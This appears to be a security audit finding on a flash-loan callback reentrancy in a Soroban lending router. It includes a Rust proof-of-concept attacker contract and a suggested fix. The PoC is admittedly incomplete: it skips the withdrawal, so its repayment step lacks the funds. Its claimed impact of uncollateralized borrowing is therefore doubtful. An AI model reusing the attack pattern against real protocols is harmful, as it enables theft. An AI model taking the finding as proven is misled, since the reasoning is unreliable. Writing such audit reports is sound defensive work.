# Flash Loan Callback Reentrancy Amplification

## Severity: High

## Summary

The K2 Lending flash loan implementation in `kinetic-router/src/flash_loan.rs` executes a callback to a user-supplied contract before validating repayment. While Soroban has implicit reentrancy protection within a single contract, it does **not** prevent cross-contract reentrancy where a callback contract calls back into the original `KineticRouter` to perform other operations (like `supply` or `borrow`) using the flash-loaned funds. This allows an attacker to bypass collateral requirements by using the flash-loaned asset as collateral for a borrow within the same transaction.

## Vulnerability Detail

The flash loan flow in `flash_loan.rs` follows these steps:
1. Transfer the requested asset to the `receiver` address.
2. Invoke the `execute_operation` function on the `receiver` contract.
3. Validate that the asset has been returned to the pool plus the required premium.

**Vulnerable Execution Flow** (`flash_loan.rs`):
```rust
// 1. Funds transferred to receiver
vault::transfer_underlying_to_user(env, &asset, receiver, amount)?;

// 2. Callback to attacker-controlled contract
let args = (asset.clone(), amount, premium, initiator.clone(), params.clone()).into_val(env);
env.invoke_contract::<bool>(receiver, &Symbol::new(env, "execute_operation"), args);

// 3. Repayment validation
let current_balance = vault::get_underlying_balance(env, &asset)?;
if current_balance < balance_before.checked_add(premium)? {
    return Err(KineticRouterError::InvalidFlashLoanRepayment);
}
```

During step 2, the `receiver` contract (which now holds the flash-loaned funds) can call back into the `KineticRouter`:

1. **`supply(asset, amount)`**: The attacker deposits the flash-loaned funds into the pool. This increases their `scaled_balance` and updates their configuration bitmap to include this asset as collateral.
2. **`borrow(other_asset, borrow_amount)`**: The attacker borrows a different asset against the collateral they just "supplied".
3. **`withdraw(asset, amount)`** (or simply use the funds from `borrow`): The attacker extracts the value.
4. **Repay**: The attacker ensures the original flash loan is repaid by the end of their `execute_operation`.

Because the flash loan is still "active" from the perspective of the `KineticRouter`, but there is no reentrancy guard or "flash loan mode" flag, the router allows the `supply` and `borrow` calls. The health factor check passes because the flash-loaned funds are now technically "supplied" collateral.

## Impact

An attacker can perform **uncollateralized borrowing**. By using flash-loaned funds as temporary collateral within the callback, they can extract other assets from the protocol without providing any of their own capital. Although they must repay the flash loan, the profit comes from the borrowed assets which are now "theirs" while the collateral (the flash loan) is gone.

This effectively breaks the protocol's core invariant that all borrows must be backed by persistent collateral.

## Code Snippet

Flash loan callback invocation:
https://github.com/code-423n4/2026-04-k2/blob/main/contracts/kinetic-router/src/flash_loan.rs#L85-L95

Missing reentrancy guard in supply/borrow:
https://github.com/code-423n4/2026-04-k2/blob/main/contracts/kinetic-router/src/operations.rs#L50
https://github.com/code-423n4/2026-04-k2/blob/main/contracts/kinetic-router/src/operations.rs#L120

## Tool Used

Manual review + Architectural analysis

## Proof of Concept

```rust
#[contractimpl]
impl FlashLoanAttacker {
    pub fn execute_operation(
        env: Env,
        asset: Address,
        amount: u128,
        premium: u128,
        initiator: Address,
        params: Bytes,
    ) -> bool {
        let router = get_router(&env);
        
        // 1. Supply the flash-loaned funds as collateral
        env.invoke_contract::<()>(
            &router,
            &Symbol::new(&env, "supply"),
            (asset.clone(), amount, env.current_contract_address()).into_val(&env),
        );

        // 2. Borrow a different valuable asset against this "collateral"
        let target_asset = get_valuable_asset(&env);
        env.invoke_contract::<()>(
            &router,
            &Symbol::new(&env, "borrow"),
            (target_asset, amount / 2, env.current_contract_address()).into_val(&env),
        );

        // 3. Withdraw the supplied funds to repay the flash loan
        // (This might require a health factor check, but the borrowed funds 
        // are already in our pocket)
        
        // 4. Repay the flash loan + premium
        transfer_back(&env, asset, amount + premium);
        
        true
    }
}
```

## Recommendation

Implement a reentrancy guard or a "flash loan status" check in the `KineticRouter` storage.

1. **Add a status flag** in `storage.rs`:
```rust
pub fn set_flash_loan_in_progress(env: &Env, status: bool) {
    env.storage().temporary().set(&symbol_short!("FL_BUSY"), &status);
}

pub fn is_flash_loan_in_progress(env: &Env) -> bool {
    env.storage().temporary().get(&symbol_short!("FL_BUSY")).unwrap_or(false)
}
```

2. **Wrap the callback** in `flash_loan.rs`:
```rust
storage::set_flash_loan_in_progress(env, true);
env.invoke_contract::<bool>(receiver, ...);
storage::set_flash_loan_in_progress(env, false);
```

3. **Check the flag** in sensitive operations (`supply`, `borrow`, `withdraw`, `swap_collateral`):
```rust
if storage::is_flash_loan_in_progress(env) {
    return Err(KineticRouterError::FlashLoanReentrancyProhibited);
}
```
